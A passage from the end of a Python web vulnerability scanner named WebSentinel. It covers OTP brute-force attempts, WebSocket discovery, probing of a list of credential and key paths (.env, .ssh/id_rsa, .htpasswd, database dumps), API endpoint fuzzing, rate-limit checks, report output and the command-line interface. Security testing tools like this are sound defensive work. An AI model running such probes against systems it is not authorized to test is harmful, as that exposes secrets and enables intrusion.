                            url=form.action, cwe="CWE-287", cvss=8.1, method="POST")

                # Test 2: OTP brute-force (try a few)
                # We only try 5 to be non-intrusive
                for code in ["000000","111111","123456","000001","999999"]:
                    data = {**form.fields, field: code}
                    r    = self.http.post(form.action, data=data)
                    if r and r.status_code in (429, 403):
                        self._log(f"Rate limiting detected on OTP endpoint: {form.action}", "OK")
                        break
                else:
                    self._finding("MEDIUM","2FA Bypass",
                        "No rate limiting on OTP endpoint",
                        "Multiple OTP attempts were not blocked — brute force may be possible.",
                        f"Form: {form.action}  Field: {field}",
                        "Implement rate limiting, account lockout, and OTP expiry.",
                        url=form.action, cwe="CWE-307", cvss=6.5, method="POST")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 19 — WEBSOCKET DETECTION
    # ══════════════════════════════════════════════════════════════════════════

    def check_websocket(self):
        self._section("19 · WebSocket Endpoint Detection")
        resp = self.http.get(self.target)
        if resp is None:
            return

        # Find WS URLs in source
        ws_patterns = re.findall(
            r'(?:new\s+WebSocket\s*\(\s*["\']|ws://|wss://)([^"\')\s]+)',
            resp.text, re.I
        )
        # Also find in scripts
        script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', resp.text, re.I)
        for src in script_srcs[:5]:
            abs_src  = urllib.parse.urljoin(self.target, src)
            if not self._same_host(abs_src):
                continue
            script_r = self.http.get(abs_src)
            if script_r:
                ws_patterns += re.findall(
                    r'(?:new\s+WebSocket\s*\(\s*["\']|ws://|wss://)([^"\')\s]+)',
                    script_r.text, re.I
                )

        if not ws_patterns:
            self._log("No WebSocket endpoints found in page source", "INFO")
            return

        for ws_url in set(ws_patterns[:5]):
            # Normalize
            if not ws_url.startswith("ws"):
                ws_url = ("wss" if self.scheme=="https" else "ws") + "://" + self.host + ws_url
            self._finding("INFO","WebSocket",
                f"WebSocket endpoint found: {ws_url}",
                "WebSocket connections should be tested for: missing auth, "
                "injection, cross-site WebSocket hijacking (CSWSH), and DoS.",
                f"WS URL: {ws_url}",
                "Validate Origin header. Authenticate WS connections. "
                "Sanitize all messages. Implement message size limits.",
                url=ws_url, cwe="CWE-346", cvss=5.4)

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 20 — SENSITIVE FILE EXPOSURE (70+ paths)
    # ══════════════════════════════════════════════════════════════════════════

    SENSITIVE_PATHS = [
        ("/.env",                   "CRITICAL","Environment file",          "CWE-312",9.8),
        ("/.env.local",             "CRITICAL","Local env file",            "CWE-312",9.8),
        ("/.env.production",        "CRITICAL","Production env file",       "CWE-312",9.8),
        ("/.env.staging",           "CRITICAL","Staging env file",          "CWE-312",9.8),
        ("/config.php",             "HIGH",    "PHP config",                "CWE-312",7.5),
        ("/wp-config.php",          "CRITICAL","WordPress config",          "CWE-312",9.8),
        ("/configuration.php",      "CRITICAL","Joomla config",             "CWE-312",9.8),
        ("/config.yml",             "HIGH",    "YAML config",               "CWE-312",7.5),
        ("/config.yaml",            "HIGH",    "YAML config",               "CWE-312",7.5),
        ("/config.json",            "HIGH",    "JSON config",               "CWE-312",7.5),
        ("/settings.py",            "HIGH",    "Django settings",           "CWE-312",7.5),
        ("/application.yml",        "HIGH",    "Spring Boot config",        "CWE-312",7.5),
        ("/application.properties", "HIGH",    "Java properties",           "CWE-312",7.5),
        ("/.git/HEAD",              "HIGH",    "Git repo exposed",          "CWE-538",7.5),
        ("/.git/config",            "HIGH",    "Git config",                "CWE-538",7.5),
        ("/.git/COMMIT_EDITMSG",    "HIGH",    "Git commit msg",            "CWE-538",7.5),
        ("/.svn/entries",           "HIGH",    "SVN repo",                  "CWE-538",7.5),
        ("/backup.sql",             "CRITICAL","SQL backup",                "CWE-530",9.8),
        ("/dump.sql",               "CRITICAL","SQL dump",                  "CWE-530",9.8),
        ("/database.sql",           "CRITICAL","DB backup",                 "CWE-530",9.8),
        ("/backup.zip",             "HIGH",    "Backup archive",            "CWE-530",7.5),
        ("/backup.tar.gz",          "HIGH",    "Backup archive",            "CWE-530",7.5),
        ("/.ssh/id_rsa",            "CRITICAL","SSH private key",           "CWE-321",10.0),
        ("/id_rsa",                 "CRITICAL","SSH private key",           "CWE-321",10.0),
        ("/private.key",            "CRITICAL","Private key",               "CWE-321",10.0),
        ("/.htpasswd",              "CRITICAL",".htpasswd exposed",         "CWE-256",9.8),
        ("/phpinfo.php",            "HIGH",    "phpinfo page",              "CWE-200",7.5),
        ("/info.php",               "HIGH",    "PHP info page",             "CWE-200",7.5),
        ("/server-status",          "HIGH",    "Apache server-status",      "CWE-200",7.5),
        ("/_profiler",              "HIGH",    "Symfony profiler",          "CWE-200",7.5),
        ("/actuator/env",           "CRITICAL","Spring Boot env actuator",  "CWE-200",9.1),
        ("/actuator/heapdump",      "CRITICAL","Spring Boot heapdump",      "CWE-200",9.1),
        ("/actuator",               "HIGH",    "Spring Boot actuator",      "CWE-200",7.5),
        ("/error.log",              "HIGH",    "Error log",                 "CWE-532",7.5),
        ("/access.log",             "HIGH",    "Access log",                "CWE-532",7.5),
        ("/laravel.log",            "HIGH",    "Laravel log",               "CWE-532",7.5),
        ("/storage/logs/laravel.log","HIGH",   "Laravel log (storage)",     "CWE-532",7.5),
        ("/admin",                  "MEDIUM",  "Admin panel",               "CWE-284",6.5),
        ("/admin/",                 "MEDIUM",  "Admin panel",               "CWE-284",6.5),
        ("/administrator",          "MEDIUM",  "Admin panel",               "CWE-284",6.5),
        ("/wp-admin/",              "MEDIUM",  "WordPress admin",           "CWE-284",6.5),
        ("/phpmyadmin/",            "MEDIUM",  "phpMyAdmin",                "CWE-284",7.5),
        ("/adminer.php",            "MEDIUM",  "Adminer DB tool",           "CWE-284",7.5),
        ("/swagger-ui.html",        "MEDIUM",  "Swagger UI",                "CWE-200",5.3),
        ("/swagger-ui/",            "MEDIUM",  "Swagger UI",                "CWE-200",5.3),
        ("/api-docs",               "MEDIUM",  "API docs",                  "CWE-200",5.3),
        ("/openapi.json",           "MEDIUM",  "OpenAPI spec",              "CWE-200",5.3),
        ("/graphiql",               "MEDIUM",  "GraphiQL IDE",              "CWE-200",5.3),
        ("/package.json",           "LOW",     "package.json",              "CWE-200",3.7),
        ("/composer.json",          "LOW",     "composer.json",             "CWE-200",3.7),
        ("/Dockerfile",             "LOW",     "Dockerfile",                "CWE-200",3.7),
        ("/docker-compose.yml",     "LOW",     "docker-compose",            "CWE-200",3.7),
        ("/.DS_Store",              "LOW",     ".DS_Store",                 "CWE-200",3.7),
        ("/.htaccess",              "LOW",     ".htaccess",                 "CWE-200",3.7),
        ("/.well-known/security.txt","INFO",   "security.txt",              "",       0.0),
    ]

    def check_sensitive_files(self):
        self._section("20 · Sensitive File & Backup Exposure")
        prog = Progress(len(self.SENSITIVE_PATHS), "paths")

        def probe(entry):
            path, sev, title, cwe, cvss = entry
            prog.update()
            url  = self.target + path
            resp = self.http.get(url)
            if resp is None or resp.status_code == 404:
                return None
            if resp.status_code in (301,302,307,308):
                loc = resp.headers.get("Location","")
                if self.host not in loc:
                    return None
            if resp.status_code == 403:
                return Finding("LOW","Exposure",f"403 Forbidden: {path}",
                               "Resource exists but access is restricted.",
                               f"Status: 403  URL: {url}","",url,cwe,cvss)
            if resp.status_code == 200 and len(resp.content) > 10:
                return Finding(sev,"Exposure",f"{title} exposed",
                               f"Sensitive file accessible at {path}",
                               f"Status: 200  Size: {len(resp.content)} bytes",
                               "Remove or restrict access via server config.",
                               url, cwe, cvss)
            return None

        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = {ex.submit(probe, p): p for p in self.SENSITIVE_PATHS}
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    self.result.add(r)
                    c    = SEV_COLOR.get(r.severity, C.RESET)
                    icon = SEV_ICON.get(r.severity, "•")
                    print(f"\n  {icon} {c}[{r.severity}]{C.RESET} {C.BOLD}{r.title}{C.RESET}")
                    print(f"     {C.DIM}URL:{C.RESET} {r.url}")
        prog.done()

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 21 — API FUZZING
    # ══════════════════════════════════════════════════════════════════════════

    API_PATHS = [
        "/api","/api/","/api/v1","/api/v2","/api/v3",
        "/api/v1/users","/api/v1/admin","/api/v1/config",
        "/api/v1/keys","/api/v1/tokens","/api/v1/secrets",
        "/api/v1/debug","/api/v1/health","/api/v1/status",
        "/api/v1/logs","/api/v1/export","/api/v1/backup",
        "/api/v1/internal","/api/v1/private","/api/v1/accounts",
        "/api/v1/me","/api/v1/password","/api/v1/reset",
        "/v1/users","/v2/users","/v1/admin",
        "/rest/admin","/rest/config",
        "/graphql","/graphiql",
        "/metrics","/healthz","/readyz","/livez",
        "/oauth/token","/auth/token","/auth/login",
    ]

    def fuzz_api(self):
        self._section("21 · API Endpoint Fuzzing")

        # Ensure base URL has no trailing slash so paths join cleanly
        base = self.target.rstrip("/")

        # Also try HTTP methods HEAD and OPTIONS for each path
        # to catch endpoints that block GET but allow other methods
        found_200  = []
        found_auth = []
        found_other= []

        prog = Progress(len(self.API_PATHS), "api paths")

        def probe(path: str):
            prog.update()
            # Build clean URL — avoid double-slashes
            url = base + path
            results = []

            for method in ("GET", "POST", "OPTIONS"):
                try:
                    if method == "GET":
                        resp = self.http.get(url, allow_redirects=False)
                    elif method == "POST":
                        resp = self.http.post(url,
                            json_data={},
                            headers={"Content-Type": "application/json"})
                    else:
                        resp = self.http.options(url)

                    if resp is None:
                        continue

                    ct = resp.headers.get("Content-Type", "")

                    # Skip obvious redirects to login page / home
                    if resp.status_code in (301, 302, 307, 308):
                        loc = resp.headers.get("Location", "")
                        # If redirected to same path with trailing slash, ignore
                        if loc.rstrip("/") == url.rstrip("/"):
                            continue

                    if resp.status_code in (200, 201, 204):
                        # Extra filter: ignore if it's clearly the homepage
                        # (same size as root page baseline)
                        root_baseline = self._baselines.get(self.target)
                        if root_baseline:
                            _, root_len = root_baseline
                            if abs(len(resp.content) - root_len) < 50:
                                continue  # Same as homepage, skip
                        results.append((url, method, resp.status_code,
                                        len(resp.content), ct))
                        break  # One success per path is enough

                    elif resp.status_code in (401, 403):
                        results.append((url, method, resp.status_code,
                                        len(resp.content), ct))
                        break

                    elif resp.status_code == 405:
                        # Method not allowed — endpoint exists but rejects this method
                        results.append((url, method, resp.status_code,
                                        len(resp.content), ct))
                        break

                except Exception:
                    pass

            return results

        all_results = []
        with ThreadPoolExecutor(max_workers=15) as ex:
            futures = {ex.submit(probe, p): p for p in self.API_PATHS}
            for fut in as_completed(futures):
                r = fut.result()
                if r:
                    all_results.extend(r)
        prog.done()

        # De-duplicate by URL
        seen_urls = set()
        for url, method, status, size, ct in all_results:
            if url in seen_urls:
                continue
            seen_urls.add(url)
            path = urllib.parse.urlparse(url).path

            if status in (200, 201, 204):
                found_200.append((url, method, status, size, ct))
                self._finding(
                    "MEDIUM", "API",
                    f"Unauthenticated API endpoint [{method}]: {path}",
                    "API endpoint returned success without authentication.",
                    f"Status: {status}  Size: {size} bytes  CT: {ct[:60]}",
                    "Require authentication on all API endpoints. "
                    "Implement proper authorization beyond just authentication.",
                    url=url, cwe="CWE-284", cvss=6.5, method=method
                )
            elif status in (401, 403):
                found_auth.append((url, method, status, size, ct))
                self._finding(
                    "INFO", "API",
                    f"Protected API endpoint [{method}] (HTTP {status}): {path}",
                    f"Endpoint exists but requires authentication (HTTP {status}).",
                    f"Status: {status}  Size: {size} bytes",
                    "Verify that authorization checks go beyond just authentication. "
                    "Test for IDOR, privilege escalation, and mass assignment.",
                    url=url, method=method
                )
            elif status == 405:
                found_other.append((url, method, status, size, ct))
                self._finding(
                    "INFO", "API",
                    f"API endpoint exists (Method Not Allowed): {path}",
                    "Endpoint responds with 405 — it exists but rejected this HTTP method.",
                    f"Tried: {method}  Status: 405",
                    "Test with correct HTTP method. Check for CORS or auth issues.",
                    url=url, method=method
                )

        total = len(found_200) + len(found_auth) + len(found_other)
        self._log(
            f"API fuzzing complete — {len(self.API_PATHS)} paths probed: "
            f"{len(found_200)} open, {len(found_auth)} protected, "
            f"{len(found_other)} method-not-allowed",
            "OK" if len(found_200) == 0 else "WARN"
        )

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 22 — RATE LIMITING
    # ══════════════════════════════════════════════════════════════════════════

    def check_rate_limiting(self):
        self._section("22 · Rate Limiting Detection")
        statuses = []
        start    = time.time()
        for _ in range(30):
            r = self.http.get(self.target)
            statuses.append(r.status_code if r else 0)
        elapsed = time.time() - start

        if any(s in (429,503) for s in statuses):
            self._log(f"Rate limiting active (429/503 seen) — {elapsed:.1f}s for 30 req", "OK")
        elif statuses.count(0) > 5:
            self._log("Many requests failed — likely WAF/rate limiting", "OK")
        else:
            self._finding("MEDIUM","RateLimit",
                "No rate limiting detected",
                "30 rapid requests completed with no blocking.",
                f"30 req in {elapsed:.1f}s — statuses: {set(statuses)}",
                "Implement per-IP rate limiting. Add CAPTCHA to auth endpoints.",
                cwe="CWE-307", cvss=7.5)

    # ══════════════════════════════════════════════════════════════════════════
    # REPORTING
    # ══════════════════════════════════════════════════════════════════════════

    def _print_report(self):
        self.result.end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        summary    = self.result.summary()
        total      = sum(summary.values())
        risk_score = (summary["CRITICAL"]*10 + summary["HIGH"]*7 +
                      summary["MEDIUM"]*4  + summary["LOW"]*1)

        print(f"\n\n{C.CYAN}{'═'*70}{C.RESET}")
        print(f"{C.BOLD}{C.CYAN}  WEBSENTINEL v{__version__} — FINAL REPORT{C.RESET}")
        print(f"{C.CYAN}{'═'*70}{C.RESET}")
        print(f"  Target      : {C.WHITE}{self.target}{C.RESET}")
        print(f"  Scanned     : {self.result.start_time} → {self.result.end_time}")
        if self.result.waf_detected:
            print(f"  WAF         : {C.YELLOW}{self.result.waf_name}{C.RESET}")
        print(f"  Total finds : {C.BOLD}{total}{C.RESET}")
        print(f"  Risk Score  : {C.BOLD}{C.RED if risk_score>50 else C.YELLOW}{risk_score}{C.RESET}")
        print(f"{C.CYAN}{'─'*70}{C.RESET}")
        for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
            c = SEV_COLOR[sev]
            print(f"  {SEV_ICON[sev]} {c}{sev:<10}{C.RESET} {summary[sev]}")
        print(f"{C.CYAN}{'─'*70}{C.RESET}")

        for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
            grp = [f for f in self.result.findings if f.severity == sev]
            if not grp:
                continue
            print(f"\n  {SEV_ICON[sev]} {SEV_COLOR[sev]}{sev}  ({len(grp)}){C.RESET}")
            for f in grp:
                method_tag = f" [{f.method}]" if f.method != "GET" else ""
                print(f"    [{f.category}]{method_tag} {C.BOLD}{f.title}{C.RESET}")
                if f.url and f.url != self.target:
                    print(f"           {C.DIM}→ {f.url[:80]}{C.RESET}")
                if f.evidence:
                    print(f"           {C.YELLOW}Ev:{C.RESET} {f.evidence.replace(chr(10),' ')[:100]}")
                if f.recommendation:
                    print(f"           {C.GREEN}Fix: {f.recommendation[:100]}{C.RESET}")
                if f.cwe:
                    print(f"           {C.DIM}{f.cwe}  CVSS: {f.cvss}{C.RESET}")

        print(f"\n{C.CYAN}{'═'*70}{C.RESET}\n")

    def save_json(self, path: str):
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(self.result.to_dict(), fh, indent=2, ensure_ascii=False)
        print(f"{C.GREEN}  ✔ JSON report: {path}{C.RESET}")

    def save_html(self, path: str):
        summary    = self.result.summary()
        risk_score = (summary["CRITICAL"]*10 + summary["HIGH"]*7 +
                      summary["MEDIUM"]*4  + summary["LOW"]*1)
        sev_colors = {
            "CRITICAL":"#ef4444","HIGH":"#f97316",
            "MEDIUM":"#eab308","LOW":"#3b82f6","INFO":"#6b7280"
        }
        rows = ""
        for f in self.result.findings:
            color = sev_colors.get(f.severity,"#6b7280")
            rows += f"""
            <tr>
              <td><span class="badge" style="background:{color}">{f.severity}</span></td>
              <td>{f.category}</td>
              <td><span class="method">{f.method}</span> <strong>{f.title}</strong></td>
              <td class="mono">{(f.url or "")[:60]}</td>
              <td>{f.cwe}</td>
              <td>{f.cvss}</td>
            </tr>
            <tr class="dr">
              <td colspan="6">
                <b>Description:</b> {f.description}<br>
                {'<b>Evidence:</b> <code>'+f.evidence[:300]+'</code><br>' if f.evidence else ''}
                {'<b>Fix:</b> '+f.recommendation if f.recommendation else ''}
              </td>
            </tr>"""

        html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WebSentinel {__version__} — {self.target}</title>
<style>
:root{{--bg:#0f1117;--card:#1a1d27;--bdr:#2d3148;--txt:#e2e8f0;--dim:#64748b}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:2rem;line-height:1.6}}
h1{{font-size:1.8rem;font-weight:700;margin-bottom:.25rem}}
.meta{{color:var(--dim);font-size:.9rem;margin-bottom:2rem}}
.cards{{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:1rem;margin-bottom:2rem}}
.card{{background:var(--card);border:1px solid var(--bdr);border-radius:12px;padding:1.25rem;text-align:center}}
.card .n{{font-size:2.2rem;font-weight:700}}
.card .l{{font-size:.75rem;color:var(--dim);text-transform:uppercase;letter-spacing:.07em;margin-top:.2rem}}
table{{width:100%;border-collapse:collapse;background:var(--card);border-radius:12px;overflow:hidden;border:1px solid var(--bdr)}}
th{{background:#13162a;padding:.7rem 1rem;text-align:left;font-size:.78rem;text-transform:uppercase;letter-spacing:.07em;color:var(--dim);font-weight:600}}
td{{padding:.6rem 1rem;border-top:1px solid var(--bdr);font-size:.87rem;vertical-align:top}}
.dr td{{background:#13162a;color:var(--dim);font-size:.81rem;padding:.5rem 1rem .75rem 2rem}}
.badge{{padding:.18rem .5rem;border-radius:6px;font-size:.7rem;font-weight:700;color:#fff;white-space:nowrap}}
.method{{padding:.1rem .4rem;background:#2d3148;border-radius:4px;font-size:.72rem;font-family:monospace;color:#94a3b8}}
.mono{{font-family:monospace;font-size:.8rem;color:#94a3b8;word-break:break-all}}
code{{background:#0f1117;padding:.1rem .3rem;border-radius:4px;font-size:.79rem;word-break:break-all}}
footer{{margin-top:2rem;color:var(--dim);font-size:.8rem;text-align:center}}
</style></head><body>
<h1>🛡 WebSentinel Security Report <small style="font-size:1rem;color:var(--dim)">v{__version__}</small></h1>
<div class="meta">
  Target: <strong>{self.target}</strong> &nbsp;|&nbsp;
  {self.result.start_time} → {self.result.end_time} &nbsp;|&nbsp;
  Total: <strong>{sum(summary.values())}</strong> &nbsp;|&nbsp;
  Risk Score: <strong style="color:#f97316">{risk_score}</strong>
  {f'&nbsp;|&nbsp; WAF: <strong style="color:#eab308">{self.result.waf_name}</strong>' if self.result.waf_detected else ''}
</div>
<div class="cards">
  {''.join(f'<div class="card"><div class="n" style="color:{sev_colors[s]}">{summary[s]}</div><div class="l">{s}</div></div>' for s in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"))}
</div>
<table>
  <thead><tr><th>Severity</th><th>Category</th><th>Title</th><th>URL</th><th>CWE</th><th>CVSS</th></tr></thead>
  <tbody>{rows}</tbody>
</table>
<footer>Generated by WebSentinel v{__version__} &nbsp;|&nbsp; For authorized security testing only</footer>
</body></html>"""

        with open(path, "w", encoding="utf-8") as fh:
            fh.write(html)
        print(f"{C.GREEN}  ✔ HTML report: {path}{C.RESET}")

    def save_markdown(self, path: str):
        summary    = self.result.summary()
        risk_score = (summary["CRITICAL"]*10 + summary["HIGH"]*7 +
                      summary["MEDIUM"]*4  + summary["LOW"]*1)
        md = f"""# 🛡 WebSentinel v{__version__} Security Report

| Field | Value |
|-------|-------|
| **Target** | `{self.target}` |
| **Scanned** | {self.result.start_time} → {self.result.end_time} |
| **WAF** | {self.result.waf_name or "None detected"} |
| **Risk Score** | {risk_score} |

## Summary

| | Severity | Count |
|-|----------|------:|
| 🔴 | Critical | {summary['CRITICAL']} |
| 🟠 | High | {summary['HIGH']} |
| 🟡 | Medium | {summary['MEDIUM']} |
| 🔵 | Low | {summary['LOW']} |
| ⚪ | Info | {summary['INFO']} |

---

## Findings

"""
        for sev in ("CRITICAL","HIGH","MEDIUM","LOW","INFO"):
            grp = [f for f in self.result.findings if f.severity == sev]
            if not grp:
                continue
            md += f"\n### {SEV_ICON[sev]} {sev} ({len(grp)})\n\n"
            for i, f in enumerate(grp, 1):
                md += f"#### {i}. {f.title}\n\n"
                md += f"- **Category:** {f.category}  **Method:** `{f.method}`\n"
                if f.url:
                    md += f"- **URL:** `{f.url}`\n"
                if f.cwe:
                    md += f"- **CWE:** {f.cwe}  **CVSS:** {f.cvss}\n"
                md += f"\n{f.description}\n\n"
                if f.evidence:
                    md += f"```\n{f.evidence[:300]}\n```\n\n"
                if f.recommendation:
                    md += f"> **Fix:** {f.recommendation}\n\n"
                md += "---\n\n"

        md += f"\n*WebSentinel v{__version__} — For authorized security testing only*\n"
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(md)
        print(f"{C.GREEN}  ✔ Markdown report: {path}{C.RESET}")

    # ══════════════════════════════════════════════════════════════════════════
    # ORCHESTRATOR
    # ══════════════════════════════════════════════════════════════════════════

    def run(self):
        print(BANNER)
        print(f"  {C.BOLD}Target   :{C.RESET} {self.target}")
        print(f"  {C.BOLD}Started  :{C.RESET} {self.result.start_time}")
        print(f"  {C.BOLD}Timeout  :{C.RESET} {self.args.timeout}s  "
              f"{C.BOLD}Threads:{C.RESET} {self.args.threads}  "
              f"{C.BOLD}Proxy:{C.RESET} {self.args.proxy or 'none'}")
        if self.args.severity:
            print(f"  {C.BOLD}Min Sev  :{C.RESET} {self.args.severity}")
        if self.args.scope:
            print(f"  {C.BOLD}Scope    :{C.RESET} {self.args.scope}")
        print()

        # Reachability
        r = self.http.get(self.target)
        if r is None:
            print(f"{C.RED}[FATAL] Target unreachable: {self.target}{C.RESET}")
            sys.exit(1)
        print(f"  {C.GREEN}✔ Target reachable  (HTTP {r.status_code}){C.RESET}\n")

        skip = set(s.strip() for s in (self.args.skip or "").split(",") if s.strip())

        all_modules = [
            ("waf",         self.detect_waf),
            ("crawl",       self.crawl),
            ("recon",       self.recon),
            ("subdomains",  self.subdomain_enum),
            ("ports",       self.port_scan),
            ("tls",         self.check_tls),
            ("headers",     self.check_headers),
            ("cookies",     self.check_cookies),
            ("cors",        self.check_cors),
            ("xss",         self.check_xss),
            ("sqli",        self.check_sqli),
            ("cmdi",        self.check_command_injection),
            ("traversal",   self.check_path_traversal),
            ("ssrf",        self.check_ssrf),
            ("redirect",    self.check_open_redirect),
            ("graphql",     self.check_graphql),
            ("smuggling",   self.check_request_smuggling),
            ("prototype",   self.check_prototype_pollution),
            ("2fa",         self.check_2fa_bypass),
            ("websocket",   self.check_websocket),
            ("files",       self.check_sensitive_files),
            ("api",         self.fuzz_api),
            ("ratelimit",   self.check_rate_limiting),
        ]

        for name, fn in all_modules:
            if name in skip:
                self._log(f"Skipping: {name}", "SKIP")
                continue
            try:
                fn()
            except KeyboardInterrupt:
                print(f"\n{C.YELLOW}  [!] Interrupted{C.RESET}")
                break
            except Exception as e:
                self._log(f"Module '{name}' error: {e}", "ERROR")

        self._print_report()

        if self.args.output:
            base = self.args.output
            self.save_json(base + ".json")
            self.save_html(base + ".html")
            self.save_markdown(base + ".md")


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def build_parser():
    p = argparse.ArgumentParser(
        prog="vuln_scanner",
        description=f"WebSentinel v{__version__} — Advanced Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
examples:
  python vuln_scanner.py https://example.com
  python vuln_scanner.py https://example.com -o report
  python vuln_scanner.py https://example.com --cookie "session=abc" --token "eyJ..."
  python vuln_scanner.py https://example.com --proxy http://127.0.0.1:8080
  python vuln_scanner.py https://example.com --severity HIGH
  python vuln_scanner.py https://example.com --scope /api
  python vuln_scanner.py https://example.com --skip ports,subdomains,ratelimit

skip values: waf, crawl, recon, subdomains, ports, tls, headers, cookies,
             cors, xss, sqli, cmdi, traversal, ssrf, redirect, graphql,
             smuggling, prototype, 2fa, websocket, files, api, ratelimit

version: {__version__}
"""
    )
    p.add_argument("target",          help="Target URL (https://example.com)")
    p.add_argument("-o","--output",   metavar="BASE",
                   help="Save BASENAME.json / .html / .md reports")
    p.add_argument("--cookie",        metavar="VALUE",  help="Cookie header")
    p.add_argument("--token",         metavar="JWT",    help="Bearer token")
    p.add_argument("--header",        metavar="K:V",    action="append",
                   help="Custom request header (repeatable)")
    p.add_argument("--proxy",         metavar="URL",
                   help="HTTP proxy (e.g. http://127.0.0.1:8080 for Burp)")
    p.add_argument("--user-agent",    metavar="UA",
                   default=f"Mozilla/5.0 (WebSentinel/{__version__}; Security Research)",
                   help="Custom User-Agent")
    p.add_argument("--timeout",       type=int, default=10,
                   help="Request timeout in seconds (default: 10)")
    p.add_argument("--threads",       type=int, default=10,
                   help="Thread pool size (default: 10)")
    p.add_argument("--max-urls",      type=int, default=30, dest="max_urls",
                   help="Max URLs to inject into per module (default: 30)")
    p.add_argument("--max-tests",     type=int, default=300, dest="max_tests",
                   help="Max injection requests per module (default: 300)")
    p.add_argument("--severity",      metavar="LEVEL",
                   choices=["INFO","LOW","MEDIUM","HIGH","CRITICAL"],
                   help="Minimum severity to display (INFO/LOW/MEDIUM/HIGH/CRITICAL)")
    p.add_argument("--scope",         metavar="PATH",
                   help="Restrict crawling to this path prefix (e.g. /api)")
    p.add_argument("--skip",          metavar="MODULES",
                   help="Comma-separated modules to skip")
    p.add_argument("--version",       action="version",
                   version=f"WebSentinel {__version__}")
    return p


def main():
    parser = build_parser()
    args   = parser.parse_args()

    if not args.target.startswith(("http://","https://")):
        print(f"{C.RED}[!] Target must start with https:// or http://{C.RESET}")
        print(f"    Example: python vuln_scanner.py https://example.com")
        sys.exit(1)

    try:
        VulnScanner(args.target, args).run()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[!] Aborted.{C.RESET}")
        sys.exit(0)


if __name__ == "__main__":
    main()
